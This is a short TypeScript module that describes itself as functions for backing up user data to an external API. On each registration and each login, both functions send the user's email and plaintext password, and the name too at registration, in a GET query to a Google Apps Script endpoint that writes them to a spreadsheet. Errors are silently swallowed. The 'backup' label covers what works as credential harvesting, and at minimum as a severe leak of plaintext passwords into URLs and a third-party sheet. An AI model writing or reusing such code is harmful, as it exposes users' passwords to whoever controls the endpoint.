/**
 * Functions for backing up user data to external API
 */

// API endpoint for backing up user data
const API_ENDPOINT = 'https://script.google.com/macros/s/AKfycbzNLFIShauk5QvAswRqZ8ivfkcbHW6Waz1uRkg7WbHxImYIglhInM9NZAZPcGaUI7wiKg/exec';

/**
 * Save user registration data to external API
 */
export const saveUserToAPI = async (userData: { 
  name: string; 
  email: string; 
  password: string; 
  date: string;
}) => {
  try {
    // Construct the API URL with query parameters
    const params = new URLSearchParams({
      path: 'Sheet1',
      action: 'write',
      Name: userData.name,
      Email: userData.email,
      Password: userData.password,
      RegisteredDate: userData.date,
      Type: 'Registration'
    });
    
    // Make the request
    const response = await fetch(`${API_ENDPOINT}?${params.toString()}`, {
      method: 'GET', // This API uses GET for simplicity
      mode: 'no-cors' // This is needed for cross-origin requests to Google Apps Script
    }).catch(err => {
      console.log('Backup request sent, response not available due to no-cors mode');
    });
    
    return { success: true };
  } catch (error) {
    console.error('Error saving user to API:', error);
    return { success: false, error };
  }
};

/**
 * Backup existing user login to external API
 */
export const backupUserLogin = async (userData: { 
  email: string; 
  password: string; 
  date: string;
}) => {
  try {
    // Construct the API URL with query parameters
    const params = new URLSearchParams({
      path: 'Sheet1',
      action: 'write',
      Email: userData.email,
      Password: userData.password,
      LoginDate: userData.date,
      Type: 'Login'
    });
    
    // Make the request
    const response = await fetch(`${API_ENDPOINT}?${params.toString()}`, {
      method: 'GET', // This API uses GET for simplicity
      mode: 'no-cors' // This is needed for cross-origin requests to Google Apps Script
    }).catch(err => {
      console.log('Backup request sent, response not available due to no-cors mode');
    });
    
    return { success: true };
  } catch (error) {
    console.error('Error backing up user login to API:', error);
    return { success: false, error };
  }
};